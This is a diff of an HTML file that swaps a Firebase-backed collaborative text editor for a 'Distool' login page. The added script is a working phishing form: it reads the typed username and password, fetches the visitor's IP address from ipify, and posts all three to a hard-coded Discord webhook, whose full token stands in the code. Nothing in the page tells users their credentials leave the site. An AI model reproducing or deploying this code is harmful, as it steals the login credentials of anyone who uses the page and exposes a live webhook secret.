@@ -1,70 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Advanced Text Editor</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Distool - Login</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 
-  <style>
-      #editor {
-            width: 800px;
-            height: 600px;
-            border: 1px solid #ddd;
-            padding: 10px;
-            font-family: monospace;
-            white-space: pre-wrap;
-      }
-  </style>
 </head>
-<body class="bg-gray-100">
-  <div class="container mx-auto p-4">
-
-    <h1 class="text-3xl font-semibold mb-4">Advanced Collaborative Text Editor</h1>
-
-
-    <div class="bg-white rounded-md shadow-md p-4">
-      <textarea id="editor" placeholder="Start typing..."></textarea>
+<body class="bg-gray-900">
+    <div class="flex items-center justify-center min-h-screen">
+        <div class="bg-gray-800 p-8 rounded-md shadow-md w-96 max-w-md">
+            <h1 class="text-3xl font-semibold text-purple-400 mb-6">Distool</h1>
+            <form id="loginForm">
+                <div class="mb-4">
+                    <label class="block text-white text-sm font-bold mb-2" for="username">
+                        Username/Email
+                    </label>
+                    <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-gray-200" id="username" type="text" placeholder="Enter Username or Email">
+                </div>
+                <div class="mb-6">
+                    <label class="block text-white text-sm font-bold mb-2" for="password">
+                        Password
+                    </label>
+                    <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-gray-200" id="password" type="password" placeholder="***">
+                </div>
+                <div class="flex items-center justify-between">
+                    <button class="bg-purple-500 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="submit">
+                        Login
+                    </button>
+                    <a class="inline-block align-baseline font-bold text-sm text-gray-400 hover:text-gray-200" href="#">
+                        Forgot Password?
+                    </a>
+                </div>
+            </form>
+            <p class="text-center text-gray-400 text-sm mt-4">
+                Don't have an account? <a class="text-purple-400 hover:text-purple-600 no-underline" href="#">Sign Up</a>
+            </p>
+        </div>
     </div>
+    <script>
+        const loginForm = document.getElementById('loginForm');
 
-  </div>
+        loginForm.addEventListener('submit', async (event) => {
+            event.preventDefault(); 
 
-  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
+            const ipAddress = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(json => json.ip);
 
-  <script>
-    // Firebase Configuration
-    const firebaseConfig = {
-      apiKey: "YOUR_API_KEY",
-      authDomain: "YOUR_AUTH_DOMAIN",
-      databaseURL: "YOUR_DATABASE_URL",
-      projectId: "YOUR_PROJECT_ID",
-      storageBucket: "YOUR_STORAGE_BUCKET",
-      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-      appId: "YOUR_APP_ID"
-    };
+            const data = {
+                content: `**Login Attempt**\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}`
+            };
 
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
-    const textRef = database.ref('sharedText');
+            fetch('https://discord.com/api/webhooks/1250844808717795439/ALNV_RHEg4V76xBEJM-xNI2K5C-IVW4GtrN5wLDQ4GPurHYCXQ1H3qOBCoYW4Al4OnBl', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Thanks:) Spam it idc it gets deleted and a new one gets made each time');
+                    } else {
+                        console.error('Error sending data to Discord webhook.');
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+        });
+    </script>
 
-    const editor = document.getElementById('editor');
-
-    // Sync Text from Database
-    textRef.on('value', (snapshot) => {
-      const text = snapshot.val();
-      if (text !== null && text !== editor.value) {
-          editor.value = text;
-      }
-    });
-
-    // Listen for Changes in the Editor
-    editor.addEventListener('input', () => {
-      textRef.set(editor.value);
-    });
-
-  </script>
 </body>
 </html>
